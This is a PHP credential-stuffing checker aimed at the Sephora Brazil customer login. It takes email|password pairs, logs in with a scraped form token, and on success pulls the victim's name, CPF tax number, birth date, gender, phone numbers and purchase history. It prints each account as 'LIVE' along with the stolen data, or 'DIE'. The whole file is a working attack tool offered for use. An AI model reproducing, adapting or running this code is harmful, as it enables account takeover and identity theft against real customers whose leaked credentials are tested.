
<?php
set_time_limit(0);
error_reporting(0);


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$nc = new cURL();
$getoken = $nc->get('https://www.sephora.com.br/customer/account/login');
$token = getStr($getoken,'<input name="form_key" type="hidden" value="','" />');


$a = new cURL();
        $b = $a->post('https://www.sephora.com.br/customer/account/loginPost/referer/aHR0cHM6Ly93d3cuc2VwaG9yYS5jb20uYnIvY3VzdG9tZXIvYWNjb3VudC9pbmRleC8,/', 'form_key='.$token.'&login%5Busername%5D='.$email.'&login%5Bpassword%5D='.$senha.'');
        

$nc2 = new cURL();
$getinfo = $nc2->get('https://www.sephora.com.br/customer/account/edit/');

$nc3 = new cURL();
$getinfo2 = $nc3->get('https://www.sephora.com.br/sales/order/history/');

if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
                       

        if (strpos($b, 'Alterar senha')) { 

if (strpos($getinfo, '<input type="radio" name="gender" id="2" value="2"  checked="checked" >')) { $genero = "Feminino"; }else{ $genero = "Masculino"; }

if (strpos($getinfo2, 'Não há pedidos feitos.')) { $compras = "Não"; }else{ $compras = "Sim"; }

$nome = getStr($b,'<p class="name">','</p>');
$cpf = getStr($getinfo,'<input type="text" name="cpf" id="cpf" value="','" title="CPF" class="input-text" readonly/>');
$nasc = getStr($getinfo,'<input type="text" id="dob" placeholder="Nascimento (DD/MM/AAAA)*" value="','" name="dob" class=" dob-validate"/>');

$nasc = str_replace("-" , "/" , $nasc); // Depois tira o hifen


$telefone = getStr($getinfo,'<input type="text" name="telephone" id="telephone" value="','" title="Telefone" class="input-text required-entry" />');
$celular = getStr($getinfo,'<input type="text" name="cellphone" id="cellphone" value="','" title="Celular" class="input-text " />');


if($celular == ""){ $celular = "N/A"; }
if($telefone == ""){ $telefone = "N/A"; }
if($cpf == ""){ $cpf = "N/A"; }
if($nasc == ""){ $nasc = "N/A"; }

 echo "LIVE → $email|$senha | Nome: $nome | CPF: $cpf | Data de nascimento: $nasc | Sexo: $genero | Telefone: $telefone | Celular: $celular | Compras: $compras #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
 
    


?>
